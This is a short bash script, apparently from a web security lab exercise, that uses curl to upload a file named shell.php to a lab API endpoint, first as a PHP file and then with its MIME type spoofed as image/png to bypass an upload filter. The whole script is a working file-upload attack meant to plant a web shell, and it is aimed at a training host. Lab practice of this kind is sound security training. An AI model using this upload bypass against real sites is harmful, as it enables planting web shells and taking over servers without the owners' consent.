#!/usr/bin/env bash
cd "$(dirname "$0")" || exit 1
H='Host: test-s3.web0x05.hbtn'
URL='http://web0x05.hbtn/api/task1/'

echo "=== upload shell.php (champ=file, type brut) ==="
curl -s -H "$H" -F 'file=@shell.php;type=application/x-php' "$URL" ; echo
echo
echo "=== upload shell.php (MIME spoofe image/png) ==="
curl -s -H "$H" -F 'file=@shell.php;type=image/png' "$URL" ; echo
